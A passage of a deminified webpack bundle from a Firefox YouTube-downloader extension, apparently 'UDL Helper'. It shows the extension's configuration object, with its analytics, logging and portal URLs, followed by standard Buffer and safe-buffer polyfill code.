            brand: "udl",
            project: "downloader",
            platform: "gv",
            dist: "firefox",
            ads: void 0,
            manifest: "v2",
            extType: "udl-downloader-gv-firefox",
            wasm: "remote",
            analyticsType: "udl-helper",
            getBlackListEndpoint: "https://udlapi.ru/banned-videos-urls",
            analyticsUrl: "https://unidlapi.ru/stat/",
            logsUrl: "https://unidlapi.ru/logs",
            getUtmUrl: "https://unidownloader.com/user",
            socialMediaSharingUrl: "https://unidownloader.com/udl-helper?share=1",
            findOrCreateUrl: "https://unidownloader.com/api/storage/findOrCreate",
            shortUrl: "https://unidownloader.com/r/{%bundleIncrement%}",
            serviceUrl: "https://unidownloader.com/vid/{%encodedString%}?{%addFrom%}",
            contactUsUrl: "https://unidownloader.com/contact-us?{%addFrom%}",
            desktopClientUrl: "https://unidownloader.com/udl-client-youtube-downloader-and-converter",
            desktopClientName: "UDL Client",
            webPortalName: "UDL Portal",
            webPortalHostname: "unidownloader.com",
            extensionName: "UDL Helper",
            yandexMetrikaId: "55151119",
            info: { name: "udl_helper_info", hostnames: [{ starts: "unidownloader.com", ends: ".stackd.ru" }, "unidownloader.com", "getudl.ru", "getunidownloader.ru"] },
            uninstallLandingUrl: "https://unidownloader.com/post-remove-helper",
            onlineVideoPlatform: "YouTube",
            ratingUrl: "https://addons.mozilla.org/ru/firefox/addon/youtube-downloader-udl-helper/",
            servicesList: ["gv", "gvEmbed", "ig", "ok", "okEmbed"],
        };
    },
    function (module, exports) {
        "function" == typeof Object.create
            ? (module.exports = function (ctor, superCtor) {
                  superCtor && ((ctor.super_ = superCtor), (ctor.prototype = Object.create(superCtor.prototype, { constructor: { value: ctor, enumerable: !1, writable: !0, configurable: !0 } })));
              })
            : (module.exports = function (ctor, superCtor) {
                  if (superCtor) {
                      ctor.super_ = superCtor;
                      var TempCtor = function () {};
                      (TempCtor.prototype = superCtor.prototype), (ctor.prototype = new TempCtor()), (ctor.prototype.constructor = ctor);
                  }
              });
    },
    ,
    function (module, exports, __webpack_require__) {
        var buffer = __webpack_require__(6),
            Buffer = buffer.Buffer;
        function copyProps(src, dst) {
            for (var key in src) dst[key] = src[key];
        }
        function SafeBuffer(arg, encodingOrOffset, length) {
            return Buffer(arg, encodingOrOffset, length);
        }
        Buffer.from && Buffer.alloc && Buffer.allocUnsafe && Buffer.allocUnsafeSlow ? (module.exports = buffer) : (copyProps(buffer, exports), (exports.Buffer = SafeBuffer)),
            copyProps(Buffer, SafeBuffer),
            (SafeBuffer.from = function (arg, encodingOrOffset, length) {
                if ("number" == typeof arg) throw new TypeError("Argument must not be a number");
                return Buffer(arg, encodingOrOffset, length);
            }),
            (SafeBuffer.alloc = function (size, fill, encoding) {
                if ("number" != typeof size) throw new TypeError("Argument must be a number");
                var buf = Buffer(size);
                return void 0 !== fill ? ("string" == typeof encoding ? buf.fill(fill, encoding) : buf.fill(fill)) : buf.fill(0), buf;
            }),
            (SafeBuffer.allocUnsafe = function (size) {
                if ("number" != typeof size) throw new TypeError("Argument must be a number");
                return Buffer(size);
            }),
            (SafeBuffer.allocUnsafeSlow = function (size) {
                if ("number" != typeof size) throw new TypeError("Argument must be a number");
                return buffer.SlowBuffer(size);
            });
    },
    function (module, exports, __webpack_require__) {
        "use strict";
        (function (global) {
            var base64 = __webpack_require__(156),
                ieee754 = __webpack_require__(157),
                isArray = __webpack_require__(75);
            function kMaxLength() {
                return Buffer.TYPED_ARRAY_SUPPORT ? 2147483647 : 1073741823;
            }
            function createBuffer(that, length) {
                if (kMaxLength() < length) throw new RangeError("Invalid typed array length");
                return Buffer.TYPED_ARRAY_SUPPORT ? ((that = new Uint8Array(length)).__proto__ = Buffer.prototype) : (null === that && (that = new Buffer(length)), (that.length = length)), that;
            }
            function Buffer(arg, encodingOrOffset, length) {
                if (!(Buffer.TYPED_ARRAY_SUPPORT || this instanceof Buffer)) return new Buffer(arg, encodingOrOffset, length);
                if ("number" == typeof arg) {
                    if ("string" == typeof encodingOrOffset) throw new Error("If encoding is specified then the first argument must be a string");
                    return allocUnsafe(this, arg);
                }
                return from(this, arg, encodingOrOffset, length);
            }
            function from(that, value, encodingOrOffset, length) {
                if ("number" == typeof value) throw new TypeError('"value" argument must not be a number');
                return "undefined" != typeof ArrayBuffer && value instanceof ArrayBuffer
                    ? (function (that, array, byteOffset, length) {
                          if ((array.byteLength, byteOffset < 0 || array.byteLength < byteOffset)) throw new RangeError("'offset' is out of bounds");
                          if (array.byteLength < byteOffset + (length || 0)) throw new RangeError("'length' is out of bounds");
                          array = void 0 === byteOffset && void 0 === length ? new Uint8Array(array) : void 0 === length ? new Uint8Array(array, byteOffset) : new Uint8Array(array, byteOffset, length);
                          Buffer.TYPED_ARRAY_SUPPORT ? ((that = array).__proto__ = Buffer.prototype) : (that = fromArrayLike(that, array));
                          return that;
                      })(that, value, encodingOrOffset, length)
                    : "string" == typeof value
                    ? (function (that, string, encoding) {
                          ("string" == typeof encoding && "" !== encoding) || (encoding = "utf8");
                          if (!Buffer.isEncoding(encoding)) throw new TypeError('"encoding" must be a valid string encoding');
                          var length = 0 | byteLength(string, encoding),
                              actual = (that = createBuffer(that, length)).write(string, encoding);
                          actual !== length && (that = that.slice(0, actual));
                          return that;
                      })(that, value, encodingOrOffset)
                    : (function (that, obj) {
                          if (Buffer.isBuffer(obj)) {
                              var len = 0 | checked(obj.length);
                              return 0 === (that = createBuffer(that, len)).length || obj.copy(that, 0, 0, len), that;
                          }
                          if (obj) {
                              if (("undefined" != typeof ArrayBuffer && obj.buffer instanceof ArrayBuffer) || "length" in obj)
                                  return "number" != typeof obj.length || (val = obj.length) != val ? createBuffer(that, 0) : fromArrayLike(that, obj);
                              if ("Buffer" === obj.type && isArray(obj.data)) return fromArrayLike(that, obj.data);
                          }
                          var val;
                          throw new TypeError("First argument must be a string, Buffer, ArrayBuffer, Array, or array-like object.");
                      })(that, value);
            }
            function assertSize(size) {
                if ("number" != typeof size) throw new TypeError('"size" argument must be a number');
                if (size < 0) throw new RangeError('"size" argument must not be negative');
            }
            function allocUnsafe(that, size) {
                if ((assertSize(size), (that = createBuffer(that, size < 0 ? 0 : 0 | checked(size))), !Buffer.TYPED_ARRAY_SUPPORT)) for (var i = 0; i < size; ++i) that[i] = 0;
                return that;
            }
            function fromArrayLike(that, array) {
                var length = array.length < 0 ? 0 : 0 | checked(array.length);
                that = createBuffer(that, length);
                for (var i = 0; i < length; i += 1) that[i] = 255 & array[i];
                return that;
            }
            function checked(length) {
                if (length >= kMaxLength()) throw new RangeError("Attempt to allocate Buffer larger than maximum size: 0x" + kMaxLength().toString(16) + " bytes");
                return 0 | length;
            }
            function byteLength(string, encoding) {
                if (Buffer.isBuffer(string)) return string.length;
                if ("undefined" != typeof ArrayBuffer && "function" == typeof ArrayBuffer.isView && (ArrayBuffer.isView(string) || string instanceof ArrayBuffer)) return string.byteLength;
                "string" != typeof string && (string = "" + string);
                var len = string.length;
                if (0 === len) return 0;
                for (var loweredCase = !1; ; )
                    switch (encoding) {
                        case "ascii":
                        case "latin1":
                        case "binary":
                            return len;
                        case "utf8":
                        case "utf-8":
                        case void 0:
                            return utf8ToBytes(string).length;
                        case "ucs2":
                        case "ucs-2":
                        case "utf16le":
                        case "utf-16le":
                            return 2 * len;
                        case "hex":
                            return len >>> 1;
                        case "base64":
                            return base64ToBytes(string).length;
                        default:
                            if (loweredCase) return utf8ToBytes(string).length;
                            (encoding = ("" + encoding).toLowerCase()), (loweredCase = !0);
                    }
            }
            function slowToString(encoding, start, end) {
                var loweredCase = !1;
                if (((void 0 === start || start < 0) && (start = 0), start > this.length)) return "";
                if (((void 0 === end || end > this.length) && (end = this.length), end <= 0)) return "";
                if ((end >>>= 0) <= (start >>>= 0)) return "";
                for (encoding || (encoding = "utf8"); ; )
                    switch (encoding) {
                        case "hex":
                            return hexSlice(this, start, end);
                        case "utf8":
                        case "utf-8":
                            return utf8Slice(this, start, end);
                        case "ascii":
                            return asciiSlice(this, start, end);
                        case "latin1":
                        case "binary":
                            return latin1Slice(this, start, end);
                        case "base64":
                            return base64Slice(this, start, end);
                        case "ucs2":
                        case "ucs-2":
                        case "utf16le":
                        case "utf-16le":
                            return utf16leSlice(this, start, end);
                        default:
                            if (loweredCase) throw new TypeError("Unknown encoding: " + encoding);
                            (encoding = (encoding + "").toLowerCase()), (loweredCase = !0);
                    }
            }
            function swap(b, n, m) {
                var i = b[n];
                (b[n] = b[m]), (b[m] = i);
            }
            function bidirectionalIndexOf(buffer, val, byteOffset, encoding, dir) {
                if (0 === buffer.length) return -1;
                if (
                    ("string" == typeof byteOffset ? ((encoding = byteOffset), (byteOffset = 0)) : byteOffset > 2147483647 ? (byteOffset = 2147483647) : byteOffset < -2147483648 && (byteOffset = -2147483648),
                    (byteOffset = +byteOffset),
                    isNaN(byteOffset) && (byteOffset = dir ? 0 : buffer.length - 1),
                    byteOffset < 0 && (byteOffset = buffer.length + byteOffset),
                    byteOffset >= buffer.length)
                ) {
                    if (dir) return -1;
                    byteOffset = buffer.length - 1;
                } else if (byteOffset < 0) {
                    if (!dir) return -1;
                    byteOffset = 0;
                }
                if (("string" == typeof val && (val = Buffer.from(val, encoding)), Buffer.isBuffer(val))) return 0 === val.length ? -1 : arrayIndexOf(buffer, val, byteOffset, encoding, dir);
                if ("number" == typeof val)
                    return (
                        (val &= 255),
                        Buffer.TYPED_ARRAY_SUPPORT && "function" == typeof Uint8Array.prototype.indexOf
                            ? dir
                                ? Uint8Array.prototype.indexOf.call(buffer, val, byteOffset)
                                : Uint8Array.prototype.lastIndexOf.call(buffer, val, byteOffset)
                            : arrayIndexOf(buffer, [val], byteOffset, encoding, dir)
                    );
                throw new TypeError("val must be string, number or Buffer");
            }
            function arrayIndexOf(arr, val, byteOffset, encoding, dir) {
                var i,
                    indexSize = 1,
                    arrLength = arr.length,
                    valLength = val.length;
                if (void 0 !== encoding && ("ucs2" === (encoding = String(encoding).toLowerCase()) || "ucs-2" === encoding || "utf16le" === encoding || "utf-16le" === encoding)) {
                    if (arr.length < 2 || val.length < 2) return -1;
                    (indexSize = 2), (arrLength /= 2), (valLength /= 2), (byteOffset /= 2);
                }
                function read(buf, i) {
                    return 1 === indexSize ? buf[i] : buf.readUInt16BE(i * indexSize);
                }
                if (dir) {
                    var foundIndex = -1;
                    for (i = byteOffset; i < arrLength; i++)
                        if (read(arr, i) === read(val, -1 === foundIndex ? 0 : i - foundIndex)) {
                            if ((-1 === foundIndex && (foundIndex = i), i - foundIndex + 1 === valLength)) return foundIndex * indexSize;
                        } else -1 !== foundIndex && (i -= i - foundIndex), (foundIndex = -1);
                } else
                    for (byteOffset + valLength > arrLength && (byteOffset = arrLength - valLength), i = byteOffset; i >= 0; i--) {
                        for (var found = !0, j = 0; j < valLength; j++)
                            if (read(arr, i + j) !== read(val, j)) {
                                found = !1;
                                break;
                            }
                        if (found) return i;
                    }
                return -1;
            }
            function hexWrite(buf, string, offset, length) {
                offset = Number(offset) || 0;
                var remaining = buf.length - offset;
                length ? (length = Number(length)) > remaining && (length = remaining) : (length = remaining);
                var strLen = string.length;
                if (strLen % 2 != 0) throw new TypeError("Invalid hex string");
                length > strLen / 2 && (length = strLen / 2);
                for (var i = 0; i < length; ++i) {
                    var parsed = parseInt(string.substr(2 * i, 2), 16);
                    if (isNaN(parsed)) return i;
                    buf[offset + i] = parsed;
                }
                return i;
            }
            function utf8Write(buf, string, offset, length) {
                return blitBuffer(utf8ToBytes(string, buf.length - offset), buf, offset, length);
            }
            function asciiWrite(buf, string, offset, length) {
                return blitBuffer(
                    (function (str) {
                        for (var byteArray = [], i = 0; i < str.length; ++i) byteArray.push(255 & str.charCodeAt(i));
                        return byteArray;
                    })(string),
                    buf,
                    offset,
                    length
                );
            }
            function latin1Write(buf, string, offset, length) {
                return asciiWrite(buf, string, offset, length);
            }
            function base64Write(buf, string, offset, length) {
                return blitBuffer(base64ToBytes(string), buf, offset, length);
            }
            function ucs2Write(buf, string, offset, length) {
                return blitBuffer(
                    (function (str, units) {
                        for (var c, hi, lo, byteArray = [], i = 0; i < str.length && !((units -= 2) < 0); ++i) (c = str.charCodeAt(i)), (hi = c >> 8), (lo = c % 256), byteArray.push(lo), byteArray.push(hi);
                        return byteArray;
                    })(string, buf.length - offset),
                    buf,
                    offset,
                    length
                );
            }
            function base64Slice(buf, start, end) {
                return 0 === start && end === buf.length ? base64.fromByteArray(buf) : base64.fromByteArray(buf.slice(start, end));
            }
            function utf8Slice(buf, start, end) {
                end = Math.min(buf.length, end);
                for (var res = [], i = start; i < end; ) {
                    var secondByte,
                        thirdByte,
                        fourthByte,
                        tempCodePoint,
                        firstByte = buf[i],
                        codePoint = null,
                        bytesPerSequence = firstByte > 239 ? 4 : firstByte > 223 ? 3 : firstByte > 191 ? 2 : 1;
                    if (i + bytesPerSequence <= end)
                        switch (bytesPerSequence) {
                            case 1:
                                firstByte < 128 && (codePoint = firstByte);
                                break;
                            case 2:
                                128 == (192 & (secondByte = buf[i + 1])) && (tempCodePoint = ((31 & firstByte) << 6) | (63 & secondByte)) > 127 && (codePoint = tempCodePoint);
                                break;
                            case 3:
                                (secondByte = buf[i + 1]),
                                    (thirdByte = buf[i + 2]),
                                    128 == (192 & secondByte) &&
                                        128 == (192 & thirdByte) &&
                                        (tempCodePoint = ((15 & firstByte) << 12) | ((63 & secondByte) << 6) | (63 & thirdByte)) > 2047 &&
                                        (tempCodePoint < 55296 || tempCodePoint > 57343) &&
                                        (codePoint = tempCodePoint);
                                break;
                            case 4:
                                (secondByte = buf[i + 1]),
                                    (thirdByte = buf[i + 2]),
                                    (fourthByte = buf[i + 3]),
                                    128 == (192 & secondByte) &&
                                        128 == (192 & thirdByte) &&
                                        128 == (192 & fourthByte) &&
                                        (tempCodePoint = ((15 & firstByte) << 18) | ((63 & secondByte) << 12) | ((63 & thirdByte) << 6) | (63 & fourthByte)) > 65535 &&
                                        tempCodePoint < 1114112 &&
                                        (codePoint = tempCodePoint);
                        }
                    null === codePoint ? ((codePoint = 65533), (bytesPerSequence = 1)) : codePoint > 65535 && ((codePoint -= 65536), res.push(((codePoint >>> 10) & 1023) | 55296), (codePoint = 56320 | (1023 & codePoint))),
                        res.push(codePoint),
                        (i += bytesPerSequence);
                }
                return (function (codePoints) {
                    var len = codePoints.length;
                    if (len <= 4096) return String.fromCharCode.apply(String, codePoints);
                    var res = "",
                        i = 0;
                    for (; i < len; ) res += String.fromCharCode.apply(String, codePoints.slice(i, (i += 4096)));
                    return res;
                })(res);
            }
            (exports.Buffer = Buffer),
                (exports.SlowBuffer = function (length) {
                    +length != length && (length = 0);
                    return Buffer.alloc(+length);
                }),
                (exports.INSPECT_MAX_BYTES = 50),
                (Buffer.TYPED_ARRAY_SUPPORT =
                    void 0 !== global.TYPED_ARRAY_SUPPORT
                        ? global.TYPED_ARRAY_SUPPORT
                        : (function () {
                              try {
                                  var arr = new Uint8Array(1);
                                  return (
                                      (arr.__proto__ = {
                                          __proto__: Uint8Array.prototype,
                                          foo: function () {
                                              return 42;
                                          },
                                      }),
                                      42 === arr.foo() && "function" == typeof arr.subarray && 0 === arr.subarray(1, 1).byteLength
                                  );
                              } catch (e) {
                                  return !1;
                              }
                          })()),
                (exports.kMaxLength = kMaxLength()),
                (Buffer.poolSize = 8192),
                (Buffer._augment = function (arr) {
                    return (arr.__proto__ = Buffer.prototype), arr;
                }),
                (Buffer.from = function (value, encodingOrOffset, length) {
                    return from(null, value, encodingOrOffset, length);
                }),
                Buffer.TYPED_ARRAY_SUPPORT &&
                    ((Buffer.prototype.__proto__ = Uint8Array.prototype),
                    (Buffer.__proto__ = Uint8Array),
                    "undefined" != typeof Symbol && Symbol.species && Buffer[Symbol.species] === Buffer && Object.defineProperty(Buffer, Symbol.species, { value: null, configurable: !0 })),
                (Buffer.alloc = function (size, fill, encoding) {
                    return (function (that, size, fill, encoding) {
                        return (
                            assertSize(size),
                            size <= 0 ? createBuffer(that, size) : void 0 !== fill ? ("string" == typeof encoding ? createBuffer(that, size).fill(fill, encoding) : createBuffer(that, size).fill(fill)) : createBuffer(that, size)
                        );
                    })(null, size, fill, encoding);
                }),
                (Buffer.allocUnsafe = function (size) {
                    return allocUnsafe(null, size);
                }),
                (Buffer.allocUnsafeSlow = function (size) {
                    return allocUnsafe(null, size);
                }),
                (Buffer.isBuffer = function (b) {
                    return !(null == b || !b._isBuffer);
                }),
                (Buffer.compare = function (a, b) {
                    if (!Buffer.isBuffer(a) || !Buffer.isBuffer(b)) throw new TypeError("Arguments must be Buffers");
                    if (a === b) return 0;
                    for (var x = a.length, y = b.length, i = 0, len = Math.min(x, y); i < len; ++i)
                        if (a[i] !== b[i]) {
                            (x = a[i]), (y = b[i]);
                            break;
                        }
                    return x < y ? -1 : y < x ? 1 : 0;
                }),
                (Buffer.isEncoding = function (encoding) {
                    switch (String(encoding).toLowerCase()) {
                        case "hex":
                        case "utf8":
                        case "utf-8":
                        case "ascii":
                        case "latin1":
                        case "binary":
                        case "base64":
                        case "ucs2":
                        case "ucs-2":
                        case "utf16le":
                        case "utf-16le":
                            return !0;
                        default:
                            return !1;
                    }
                }),
                (Buffer.concat = function (list, length) {
                    if (!isArray(list)) throw new TypeError('"list" argument must be an Array of Buffers');
                    if (0 === list.length) return Buffer.alloc(0);
                    var i;
                    if (void 0 === length) for (length = 0, i = 0; i < list.length; ++i) length += list[i].length;
                    var buffer = Buffer.allocUnsafe(length),
                        pos = 0;
                    for (i = 0; i < list.length; ++i) {
                        var buf = list[i];
                        if (!Buffer.isBuffer(buf)) throw new TypeError('"list" argument must be an Array of Buffers');
                        buf.copy(buffer, pos), (pos += buf.length);
                    }
                    return buffer;
                }),
                (Buffer.byteLength = byteLength),
                (Buffer.prototype._isBuffer = !0),
                (Buffer.prototype.swap16 = function () {
                    var len = this.length;
                    if (len % 2 != 0) throw new RangeError("Buffer size must be a multiple of 16-bits");
                    for (var i = 0; i < len; i += 2) swap(this, i, i + 1);
                    return this;
                }),
                (Buffer.prototype.swap32 = function () {
                    var len = this.length;
                    if (len % 4 != 0) throw new RangeError("Buffer size must be a multiple of 32-bits");
                    for (var i = 0; i < len; i += 4) swap(this, i, i + 3), swap(this, i + 1, i + 2);
                    return this;
                }),
                (Buffer.prototype.swap64 = function () {
                    var len = this.length;
                    if (len % 8 != 0) throw new RangeError("Buffer size must be a multiple of 64-bits");
                    for (var i = 0; i < len; i += 8) swap(this, i, i + 7), swap(this, i + 1, i + 6), swap(this, i + 2, i + 5), swap(this, i + 3, i + 4);
                    return this;
                }),
                (Buffer.prototype.toString = function () {
                    var length = 0 | this.length;
                    return 0 === length ? "" : 0 === arguments.length ? utf8Slice(this, 0, length) : slowToString.apply(this, arguments);
                }),
                (Buffer.prototype.equals = function (b) {
                    if (!Buffer.isBuffer(b)) throw new TypeError("Argument must be a Buffer");
                    return this === b || 0 === Buffer.compare(this, b);
                }),
                (Buffer.prototype.inspect = function () {
                    var str = "",
                        max = exports.INSPECT_MAX_BYTES;
                    return this.length > 0 && ((str = this.toString("hex", 0, max).match(/.{2}/g).join(" ")), this.length > max && (str += " ... ")), "<Buffer " + str + ">";
                }),
                (Buffer.prototype.compare = function (target, start, end, thisStart, thisEnd) {
                    if (!Buffer.isBuffer(target)) throw new TypeError("Argument must be a Buffer");
                    if (
                        (void 0 === start && (start = 0),
                        void 0 === end && (end = target ? target.length : 0),
                        void 0 === thisStart && (thisStart = 0),
                        void 0 === thisEnd && (thisEnd = this.length),
                        start < 0 || end > target.length || thisStart < 0 || thisEnd > this.length)
                    )
                        throw new RangeError("out of range index");
                    if (thisStart >= thisEnd && start >= end) return 0;
                    if (thisStart >= thisEnd) return -1;
                    if (start >= end) return 1;
                    if (this === target) return 0;
                    for (var x = (thisEnd >>>= 0) - (thisStart >>>= 0), y = (end >>>= 0) - (start >>>= 0), len = Math.min(x, y), thisCopy = this.slice(thisStart, thisEnd), targetCopy = target.slice(start, end), i = 0; i < len; ++i)
                        if (thisCopy[i] !== targetCopy[i]) {
                            (x = thisCopy[i]), (y = targetCopy[i]);
                            break;
                        }
                    return x < y ? -1 : y < x ? 1 : 0;
                }),
                (Buffer.prototype.includes = function (val, byteOffset, encoding) {
                    return -1 !== this.indexOf(val, byteOffset, encoding);
                }),
                (Buffer.prototype.indexOf = function (val, byteOffset, encoding) {
                    return bidirectionalIndexOf(this, val, byteOffset, encoding, !0);
                }),
                (Buffer.prototype.lastIndexOf = function (val, byteOffset, encoding) {
                    return bidirectionalIndexOf(this, val, byteOffset, encoding, !1);
                }),
                (Buffer.prototype.write = function (string, offset, length, encoding) {
                    if (void 0 === offset) (encoding = "utf8"), (length = this.length), (offset = 0);
                    else if (void 0 === length && "string" == typeof offset) (encoding = offset), (length = this.length), (offset = 0);
                    else {
                        if (!isFinite(offset)) throw new Error("Buffer.write(string, encoding, offset[, length]) is no longer supported");
                        (offset |= 0), isFinite(length) ? ((length |= 0), void 0 === encoding && (encoding = "utf8")) : ((encoding = length), (length = void 0));
                    }
                    var remaining = this.length - offset;
                    if (((void 0 === length || length > remaining) && (length = remaining), (string.length > 0 && (length < 0 || offset < 0)) || offset > this.length)) throw new RangeError("Attempt to write outside buffer bounds");
                    encoding || (encoding = "utf8");
                    for (var loweredCase = !1; ; )
                        switch (encoding) {
                            case "hex":
                                return hexWrite(this, string, offset, length);
                            case "utf8":
                            case "utf-8":
                                return utf8Write(this, string, offset, length);
                            case "ascii":
                                return asciiWrite(this, string, offset, length);
                            case "latin1":
                            case "binary":
                                return latin1Write(this, string, offset, length);
                            case "base64":
                                return base64Write(this, string, offset, length);
                            case "ucs2":
                            case "ucs-2":
                            case "utf16le":
                            case "utf-16le":
                                return ucs2Write(this, string, offset, length);
                            default:
                                if (loweredCase) throw new TypeError("Unknown encoding: " + encoding);
                                (encoding = ("" + encoding).toLowerCase()), (loweredCase = !0);
                        }
                }),
                (Buffer.prototype.toJSON = function () {
                    return { type: "Buffer", data: Array.prototype.slice.call(this._arr || this, 0) };
                });
            function asciiSlice(buf, start, end) {
                var ret = "";
                end = Math.min(buf.length, end);
                for (var i = start; i < end; ++i) ret += String.fromCharCode(127 & buf[i]);
                return ret;
            }
            function latin1Slice(buf, start, end) {
                var ret = "";
                end = Math.min(buf.length, end);
                for (var i = start; i < end; ++i) ret += String.fromCharCode(buf[i]);
                return ret;
            }
            function hexSlice(buf, start, end) {
                var len = buf.length;
                (!start || start < 0) && (start = 0), (!end || end < 0 || end > len) && (end = len);
                for (var out = "", i = start; i < end; ++i) out += toHex(buf[i]);
                return out;
            }
            function utf16leSlice(buf, start, end) {
                for (var bytes = buf.slice(start, end), res = "", i = 0; i < bytes.length; i += 2) res += String.fromCharCode(bytes[i] + 256 * bytes[i + 1]);
                return res;
            }
            function checkOffset(offset, ext, length) {
                if (offset % 1 != 0 || offset < 0) throw new RangeError("offset is not uint");
                if (offset + ext > length) throw new RangeError("Trying to access beyond buffer length");
            }
            function checkInt(buf, value, offset, ext, max, min) {
                if (!Buffer.isBuffer(buf)) throw new TypeError('"buffer" argument must be a Buffer instance');
                if (value > max || value < min) throw new RangeError('"value" argument is out of bounds');
                if (offset + ext > buf.length) throw new RangeError("Index out of range");
            }
            function objectWriteUInt16(buf, value, offset, littleEndian) {
                value < 0 && (value = 65535 + value + 1);
                for (var i = 0, j = Math.min(buf.length - offset, 2); i < j; ++i) buf[offset + i] = (value & (255 << (8 * (littleEndian ? i : 1 - i)))) >>> (8 * (littleEndian ? i : 1 - i));
            }
            function objectWriteUInt32(buf, value, offset, littleEndian) {
                value < 0 && (value = 4294967295 + value + 1);
                for (var i = 0, j = Math.min(buf.length - offset, 4); i < j; ++i) buf[offset + i] = (value >>> (8 * (littleEndian ? i : 3 - i))) & 255;
            }
            function checkIEEE754(buf, value, offset, ext, max, min) {
                if (offset + ext > buf.length) throw new RangeError("Index out of range");
                if (offset < 0) throw new RangeError("Index out of range");
            }
            function writeFloat(buf, value, offset, littleEndian, noAssert) {
                return noAssert || checkIEEE754(buf, 0, offset, 4), ieee754.write(buf, value, offset, littleEndian, 23, 4), offset + 4;
            }
            function writeDouble(buf, value, offset, littleEndian, noAssert) {
                return noAssert || checkIEEE754(buf, 0, offset, 8), ieee754.write(buf, value, offset, littleEndian, 52, 8), offset + 8;
            }
            (Buffer.prototype.slice = function (start, end) {
                var newBuf,
                    len = this.length;
                if (
                    ((start = ~~start) < 0 ? (start += len) < 0 && (start = 0) : start > len && (start = len),
                    (end = void 0 === end ? len : ~~end) < 0 ? (end += len) < 0 && (end = 0) : end > len && (end = len),
                    end < start && (end = start),
                    Buffer.TYPED_ARRAY_SUPPORT)
                )
                    (newBuf = this.subarray(start, end)).__proto__ = Buffer.prototype;
                else {
                    var sliceLen = end - start;
                    newBuf = new Buffer(sliceLen, void 0);
                    for (var i = 0; i < sliceLen; ++i) newBuf[i] = this[i + start];
                }
                return newBuf;
            }),
                (Buffer.prototype.readUIntLE = function (offset, byteLength, noAssert) {
                    (offset |= 0), (byteLength |= 0), noAssert || checkOffset(offset, byteLength, this.length);
                    for (var val = this[offset], mul = 1, i = 0; ++i < byteLength && (mul *= 256); ) val += this[offset + i] * mul;
                    return val;
                }),
                (Buffer.prototype.readUIntBE = function (offset, byteLength, noAssert) {
                    (offset |= 0), (byteLength |= 0), noAssert || checkOffset(offset, byteLength, this.length);
                    for (var val = this[offset + --byteLength], mul = 1; byteLength > 0 && (mul *= 256); ) val += this[offset + --byteLength] * mul;
                    return val;
                }),
                (Buffer.prototype.readUInt8 = function (offset, noAssert) {
                    return noAssert || checkOffset(offset, 1, this.length), this[offset];
                }),
                (Buffer.prototype.readUInt16LE = function (offset, noAssert) {
                    return noAssert || checkOffset(offset, 2, this.length), this[offset] | (this[offset + 1] << 8);
                }),
                (Buffer.prototype.readUInt16BE = function (offset, noAssert) {
                    return noAssert || checkOffset(offset, 2, this.length), (this[offset] << 8) | this[offset + 1];
                }),
                (Buffer.prototype.readUInt32LE = function (offset, noAssert) {
                    return noAssert || checkOffset(offset, 4, this.length), (this[offset] | (this[offset + 1] << 8) | (this[offset + 2] << 16)) + 16777216 * this[offset + 3];
                }),
                (Buffer.prototype.readUInt32BE = function (offset, noAssert) {
                    return noAssert || checkOffset(offset, 4, this.length), 16777216 * this[offset] + ((this[offset + 1] << 16) | (this[offset + 2] << 8) | this[offset + 3]);
                }),
                (Buffer.prototype.readIntLE = function (offset, byteLength, noAssert) {
                    (offset |= 0), (byteLength |= 0), noAssert || checkOffset(offset, byteLength, this.length);
                    for (var val = this[offset], mul = 1, i = 0; ++i < byteLength && (mul *= 256); ) val += this[offset + i] * mul;
                    return val >= (mul *= 128) && (val -= Math.pow(2, 8 * byteLength)), val;
                }),
                (Buffer.prototype.readIntBE = function (offset, byteLength, noAssert) {
                    (offset |= 0), (byteLength |= 0), noAssert || checkOffset(offset, byteLength, this.length);
                    for (var i = byteLength, mul = 1, val = this[offset + --i]; i > 0 && (mul *= 256); ) val += this[offset + --i] * mul;
                    return val >= (mul *= 128) && (val -= Math.pow(2, 8 * byteLength)), val;
                }),
                (Buffer.prototype.readInt8 = function (offset, noAssert) {
                    return noAssert || checkOffset(offset, 1, this.length), 128 & this[offset] ? -1 * (255 - this[offset] + 1) : this[offset];
                }),
                (Buffer.prototype.readInt16LE = function (offset, noAssert) {
                    noAssert || checkOffset(offset, 2, this.length);
                    var val = this[offset] | (this[offset + 1] << 8);
                    return 32768 & val ? 4294901760 | val : val;
                }),
                (Buffer.prototype.readInt16BE = function (offset, noAssert) {
                    noAssert || checkOffset(offset, 2, this.length);
                    var val = this[offset + 1] | (this[offset] << 8);
                    return 32768 & val ? 4294901760 | val : val;
                }),
                (Buffer.prototype.readInt32LE = function (offset, noAssert) {
                    return noAssert || checkOffset(offset, 4, this.length), this[offset] | (this[offset + 1] << 8) | (this[offset + 2] << 16) | (this[offset + 3] << 24);
                }),
                (Buffer.prototype.readInt32BE = function (offset, noAssert) {
                    return noAssert || checkOffset(offset, 4, this.length), (this[offset] << 24) | (this[offset + 1] << 16) | (this[offset + 2] << 8) | this[offset + 3];
                }),
                (Buffer.prototype.readFloatLE = function (offset, noAssert) {
                    return noAssert || checkOffset(offset, 4, this.length), ieee754.read(this, offset, !0, 23, 4);
                }),
                (Buffer.prototype.readFloatBE = function (offset, noAssert) {
                    return noAssert || checkOffset(offset, 4, this.length), ieee754.read(this, offset, !1, 23, 4);
                }),
                (Buffer.prototype.readDoubleLE = function (offset, noAssert) {
                    return noAssert || checkOffset(offset, 8, this.length), ieee754.read(this, offset, !0, 52, 8);
                }),
                (Buffer.prototype.readDoubleBE = function (offset, noAssert) {
                    return noAssert || checkOffset(offset, 8, this.length), ieee754.read(this, offset, !1, 52, 8);
                }),
                (Buffer.prototype.writeUIntLE = function (value, offset, byteLength, noAssert) {
                    ((value = +value), (offset |= 0), (byteLength |= 0), noAssert) || checkInt(this, value, offset, byteLength, Math.pow(2, 8 * byteLength) - 1, 0);
                    var mul = 1,
                        i = 0;
                    for (this[offset] = 255 & value; ++i < byteLength && (mul *= 256); ) this[offset + i] = (value / mul) & 255;
                    return offset + byteLength;
                }),
                (Buffer.prototype.writeUIntBE = function (value, offset, byteLength, noAssert) {
                    ((value = +value), (offset |= 0), (byteLength |= 0), noAssert) || checkInt(this, value, offset, byteLength, Math.pow(2, 8 * byteLength) - 1, 0);
                    var i = byteLength - 1,
                        mul = 1;
                    for (this[offset + i] = 255 & value; --i >= 0 && (mul *= 256); ) this[offset + i] = (value / mul) & 255;
                    return offset + byteLength;
                }),
                (Buffer.prototype.writeUInt8 = function (value, offset, noAssert) {
